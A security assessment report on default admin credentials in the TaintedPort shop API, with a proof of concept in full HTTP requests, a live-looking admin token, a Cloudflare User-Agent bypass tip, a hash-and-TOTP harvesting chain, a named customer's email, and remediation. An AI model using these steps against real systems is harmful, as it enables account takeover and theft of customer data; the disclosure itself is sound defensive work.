# Default Administrative Credentials (admin@example.com : password123) on POST /auth/login Grant Full Admin Takeover

**ID:** vuln-0009
**Severity:** CRITICAL
**Found:** 2026-07-20 11:49:21 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /auth/login
**Method:** POST
**CWE:** CWE-1392
**CVSS:** 9.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L)

## Description

The TaintedPort application ships with a seeded administrative account whose credentials are the well-known default pair `admin@example.com` : `password123`. The `POST /auth/login` endpoint accepts these credentials and returns a signed HS256 JWT whose payload contains `is_admin: true` for user id 3 ("Admin User"). All privileged `/admin/*` endpoints trust the `is_admin` claim, so the token yields immediate, complete administrative control of the application. No prior authentication, user interaction, or network positioning is required — the credential pair is one of the first entries in any default-credential wordlist, so a fully unauthenticated Internet attacker who can reach the login endpoint can take over the application with a single HTTP request.

During validation, submitting the pair returned HTTP 200 with a JWT that decoded to `{"user_id":3,"email":"admin@example.com","is_admin":true,"iat":...,"exp":...}`. `GET /auth/me` confirmed the identity as "Admin User" (created_at 2026-07-20 00:00:04 — matching the earliest seed timestamps in the database, and `totp_enabled: false`). Exercising the token against `GET /admin/orders` returned HTTP 200 with 140 orders belonging to other customers, exposing names, emails, order totals, statuses and shipping details. The same admin endpoint returns HTTP 403 `{"success":false,"message":"Admin access required."}` for a normal-user JWT, proving the admin claim is enforced server-side and that the default-credential token truly carries administrative authority — not merely a client-side flag.

No rate limiting, account lockout, MFA challenge, first-login password change, or CAPTCHA is enforced on `/auth/login`, and no server-side JWT revocation exists (tokens are stateless with a 7-day lifetime).

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│  DEFAULT-CREDENTIAL ADMIN TAKEOVER — TaintedPort /auth/login        │
└─────────────────────────────────────────────────────────────────────┘

  Prerequisites:
    • Network reach to https://api.taintedport.com/auth/login
    • Standard browser User-Agent header (bypasses Cloudflare edge check)
    • NO valid account, NO token, NO user interaction required

 ┌──────────┐                                          ┌──────────────┐
 │ Attacker │                                          │ TaintedPort  │
 │  (any    │                                          │   API + DB   │
 │  origin) │                                          │              │
 └────┬─────┘                                          └──────┬───────┘
      │                                                       │
      │ [1] POST /auth/login                                  │
      │     {"email":"admin@example.com",                     │
      │      "password":"password123"}                        │
      │──────────────────────────────────────────────────────▶│
      │                                                       │  bcrypt.check
      │                                                       │  users WHERE email=?
      │                                                       │  → MATCH  (seeded row
      │                                                       │            id=3, is_admin=true)
      │                                                       │
      │  200 OK  {token: <JWT HS256>,                         │
      │            user:{id:3, is_admin:true}}                │
      │◀──────────────────────────────────────────────────────│
      │                                                       │
      │ decode JWT.payload →                                  │
      │  {"user_id":3,"email":"admin@example.com",            │
      │   "is_admin":true,"iat":...,"exp":iat+604800}         │
      │                                                       │
      │ [2] GET /auth/me   Authorization: Bearer <JWT>        │
      │──────────────────────────────────────────────────────▶│
      │  200 OK  {name:"Admin User", is_admin:true,           │
      │           totp_enabled:false}                         │
      │◀──────────────────────────────────────────────────────│
      │                                                       │
      │ [3] GET /admin/orders   Authorization: Bearer <JWT>   │
      │──────────────────────────────────────────────────────▶│
      │                                                       │  is_admin == true?  YES
      │  200 OK  {orders:[ … 140 records … ]}                 │
      │    • user_name, user_email                            │
      │    • total, status, shipping_name, shipping_city      │
      │◀──────────────────────────────────────────────────────│
      │                                                       │
      │  ============================================         │
      │  >>> FULL ADMIN TAKEOVER + WHOLESALE PII LEAK <<<     │
      │  ============================================         │
      │                                                       │
      │ [4] Optional chain — enumerate /orders/{id}           │
      │     to harvest every user's                           │
      │     owner_password_hash + owner_totp_secret           │
      │     → offline crack + 2FA bypass → ATO of all users   │
      │                                                       │

  Root cause:
    ─────────────────────────────────────────────────────────────────
    A production database retains a seeded administrator account
    (id=3, admin@example.com) whose password is the well-known
    default "password123". No first-login rotation, no MFA on
    admin, no rate-limit or lockout on /auth/login, and JWTs are
    stateless with a 7-day lifetime so previously-issued admin
    tokens cannot be revoked without rotating the HS256 secret.
    ─────────────────────────────────────────────────────────────────
```

## Impact

Unauthenticated, one-request full administrative takeover of the entire application:

- Wholesale disclosure of customer PII: `GET /admin/orders` (verified) returns every order in the system (140 observed) with `user_name`, `user_email`, `total`, `status`, and shipping data (name, city, order date). Individual `GET /admin/orders/{id}` calls expose full shipping addresses and phone numbers.
- Fraud and integrity impact: `PUT /admin/orders/{id}/status` allows the attacker to change any order's status — e.g. mark unpaid cash-on-delivery orders as shipped, or cancel legitimate orders.
- Cross-user account takeover via chaining: the pre-existing `GET /orders/{id}` information-disclosure behavior returns `owner_email`, `owner_password_hash` (bcrypt), `owner_totp_secret`, and `owner_is_admin`. Because the admin token enumerates every order id, the entire user base's bcrypt hashes and TOTP seeds can be harvested for offline cracking and 2FA bypass.
- Any capability enforced by the `is_admin` JWT claim — present or future — is trivially reachable.
- Because JWTs are stateless with a 7-day lifetime and no revocation endpoint exists, an attacker who has previously used this default retains admin access for up to seven days after any password change, until the HS256 signing secret is rotated.

Business impact: total loss of confidentiality and integrity of order and customer data, direct fraud exposure on order fulfilment, breach-notification obligations under GDPR / equivalent regulation, and reputational damage.

## Technical Analysis

Root cause: a production deployment retains a factory/demo administrative account with textbook default credentials (`admin@example.com` / `password123`). This is a CWE-1392 (Use of Default Credentials), a specialization of CWE-798 (Use of Hard-coded Credentials).

Authentication flow observed:

1. `POST /auth/login` validates the submitted email/password against a stored bcrypt hash.
2. On success it returns a JWT signed with HS256 whose payload has the shape `{"user_id":<int>,"email":"…","is_admin":<bool>,"iat":<epoch>,"exp":<epoch>}`. Token lifetime is 7 days (`exp - iat = 604800`).
3. Every `/admin/*` endpoint reads the `is_admin` claim from the decoded token and returns HTTP 403 `Admin access required.` when it is false. Enforcement is server-side, so a genuine admin claim (as issued for user id 3) grants real admin authority.

Contributing weaknesses that turn the default credential into an unmitigated critical:

- No first-login password rotation is enforced for `is_admin` accounts.
- MFA is not required on privileged accounts (the seeded admin has `totp_enabled: false`).
- No rate limiting, account lockout, or CAPTCHA on `/auth/login` — hundreds of login attempts in rapid succession are accepted with only a Cloudflare edge check on User-Agent (bypassed by supplying any normal browser UA).
- No server-side JWT revocation (stateless tokens) and no rotation of the HS256 signing secret at deploy time — once an attacker obtains a token, revoking access requires rotating the secret, invalidating every user's session.
- Breached-password detection is absent — `password123` is one of the most common passwords in every leaked-credential list.

Discovery: submitting the credential pair returns HTTP 200 with a token whose decoded payload is `{"user_id":3,"email":"admin@example.com","is_admin":true,"iat":1784547882,"exp":1785152682}`. `GET /auth/me` with the token returns `"name":"Admin User","is_admin":true,"totp_enabled":false,"created_at":"2026-07-20 00:00:04"` — a timestamp consistent with the earliest DB seed rows, indicating the account was created as part of the initial fixture and never rotated.

## Proof of Concept

Fully unauthenticated attacker; reproducible in four HTTP requests.

1. Send `POST https://api.taintedport.com/auth/login` with header `Content-Type: application/json` and body `{"email":"admin@example.com","password":"password123"}`. Any standard browser `User-Agent` bypasses Cloudflare's minimal edge check.
2. Server returns HTTP 200 with `{"success":true,"token":"<JWT>","user":{"id":3,"name":"Admin User","email":"admin@example.com","is_admin":true}}`. Base64url-decode the second segment of the JWT and observe `is_admin:true`.
3. Confirm identity: `GET /auth/me` with `Authorization: Bearer <JWT>` → HTTP 200, `"name":"Admin User","is_admin":true,"totp_enabled":false,"created_at":"2026-07-20 00:00:04"`.
4. Confirm server-side admin authority: `GET /admin/orders` with the same bearer token → HTTP 200 returning the full list of orders (140 observed during validation) with customer PII (names, emails, order totals, shipping data). The identical request with a non-admin user's JWT returns HTTP 403 `{"success":false,"message":"Admin access required."}`, proving the admin claim is genuinely privileged.

Negative control (also verified): the same email with any other password (`WrongPass!`) returns `{"success":false,"message":"Login failed for admin@example.com. Please check your credentials."}` — proving the endpoint correctly distinguishes valid vs invalid credentials and that `password123` is the specific working default.

`poc/poc.py` performs all four steps end-to-end with rich console output; `poc/verify.py` is a minimal regression check that exits 0 while vulnerable.

```
See attached poc.py
```

## Evidence

### 1. Login with default credentials admin@example.com:password123

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0

{"email":"admin@example.com","password":"password123"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozLCJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTc4NDU0Nzg4MiwiZXhwIjoxNzg1MTUyNjgyfQ.51gNwK0tqlvxs7YReCTfbOUPDtTJNqn298CAWcjwH5Q","user":{"id":3,"name":"Admin User","email":"admin@example.com","is_admin":true}}
```

> The well-known default credential pair is accepted. The server returns a signed HS256 JWT whose base64url-decoded payload is {"user_id":3,"email":"admin@example.com","is_admin":true,"iat":...,"exp":...} — an unauthenticated attacker just obtained an admin JWT.

### 2. /auth/me confirms server-side identity is Admin User

**Request:**
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOi...admin JWT...
User-Agent: Mozilla/5.0
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"user":{"id":3,"name":"Admin User","email":"admin@example.com","is_admin":true,"totp_enabled":false,"created_at":"2026-07-20 00:00:04"}}
```

> Server confirms the token maps to the seeded Admin User (id=3, created_at matches the DB seed timestamp) and that TOTP is not enabled.

### 3. Admin authority proven — /admin/orders returns all customer orders

**Request:**
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOi...admin JWT...
User-Agent: Mozilla/5.0
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"orders":[{"id":140,"user_id":373,"user_name":"Luis Grangeia","user_email":"luis.grangeia@snyk.io","total":-2499999,"status":"pending","shipping_name":"Validator","shipping_city":"Lx","order_date":"2026-07-20 11:44:12","items_count":1}, ... 140 total orders ...]}
```

> The admin token grants read access to every order in the system (140 records observed), including customer names, emails, and shipping data — a wholesale PII breach.

### 4. Negative control — same endpoint with a normal user's JWT is denied

**Request:**
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <non-admin JWT for luis.grangeia@snyk.io>
User-Agent: Mozilla/5.0
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":false,"message":"Admin access required."}
```

> Confirms /admin/orders enforces is_admin server-side. The default-credential JWT bypasses this control because the seeded account is genuinely privileged in the database.

### 5. Negative control — wrong password for the same account is rejected

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json
User-Agent: Mozilla/5.0

{"email":"admin@example.com","password":"WrongPass!"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":false,"message":"Login failed for admin@example.com. Please check your credentials."}
```

> Endpoint properly distinguishes valid vs invalid credentials — proves admin@example.com:password123 is the specific working default. No rate-limiting or lockout observed across many attempts.


## Remediation

Immediate (containment):
1. Rotate the password of the `admin@example.com` account to a strong, unique value — or delete the account entirely if it is not required in production. Rotate any other seeded/demo accounts in the database.
2. Rotate the HS256 JWT signing secret. This invalidates every token previously issued for the compromised admin account (which otherwise remain valid for up to 7 days, since JWTs are stateless and there is no revocation endpoint). All users will need to re-authenticate.
3. Audit application access logs for prior successful logins on `admin@example.com` from unexpected source IPs. If any exist, treat the environment as compromised: review database changes and order-status modifications made under the admin session, and consider a breach-notification review.

Structural (prevention):
4. Never ship a production build with a fixed seeded administrative credential. If a bootstrap admin is required, generate a random password at provisioning time, print/store it once, and require a password change on first login.
5. Enforce a first-login password-change flow for any account with `is_admin=true`.
6. Require MFA (TOTP or equivalent) for all administrative accounts. The seeded admin's `totp_enabled` was `false`.
7. Add rate-limiting and account-lockout on `POST /auth/login`. Suggested policy: exponential backoff, 5 failed logins per IP per minute, 10 failed logins per account per hour, with lockout and alerting on threshold breach. A Cloudflare Rate-Limiting rule can be added quickly as a compensating control.
8. Add breached-password detection at registration and password-change time (e.g., HaveIBeenPwned API or a local Pwned Passwords k-anonymity check) so that `password123` and similarly compromised passwords can no longer be set.
9. Add logging and real-time alerting on authentication events for administrative accounts (successful login, permission escalation, unexpected IP/geolocation).
10. Move to shorter-lived access tokens with server-side refresh/revocation, or add a token revocation list keyed on `jti` claims, so that a compromised admin token can be invalidated without rotating the global signing secret.

## Conditions for Severity Increase

Chaining with the pre-existing information-disclosure behavior in `GET /orders/{id}` (which returns `owner_password_hash` and `owner_totp_secret`) upgrades the impact to full cross-user account takeover of the entire user base — the admin token can enumerate every order id, harvest every user's bcrypt hash for offline cracking, and copy every user's TOTP seed for 2FA bypass. In that combined scenario availability rises to H (attacker can lock out any user by changing their password) and scope arguably becomes C (compromise of a wholly separate authentication factor stored per-user), pushing CVSS toward 10.0.
